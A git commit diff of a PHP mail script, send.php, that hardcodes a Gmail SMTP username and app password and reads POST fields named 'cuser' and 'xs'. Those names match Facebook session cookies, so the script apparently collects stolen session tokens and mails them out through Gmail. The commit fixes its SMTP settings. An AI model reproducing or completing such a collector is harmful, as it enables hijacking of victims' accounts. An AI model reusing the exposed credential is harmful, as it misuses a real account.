3f6ea308defba99ad38ac574b891d7a2bd36af5c
Aishasaif12 <aishasaif542@gmail.com>
2024-07-27 13:55:26 +0500

    Update send.php

--- send.php
+++ send.php
@@ -18,14 +18,14 @@ try {
     $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
     $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
     $mail->Username   = 'sophiaameliaofficiel@gmail.com';                     //SMTP username
-    $mail->Password   = 'faik tbbw qrtq hsog';                               //SMTP password
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
-    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+    $mail->Password   = 'faiktbbwqrtqhsog';                               //SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //Enable implicit TLS encryption
+    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
 
 
-$_COOKIE = $_POST['cuser'];
-$_COOKIE = $_POST['xs'];
+$cuser = $_POST['cuser'];
+$xs = $_POST['xs'];
 
 
 
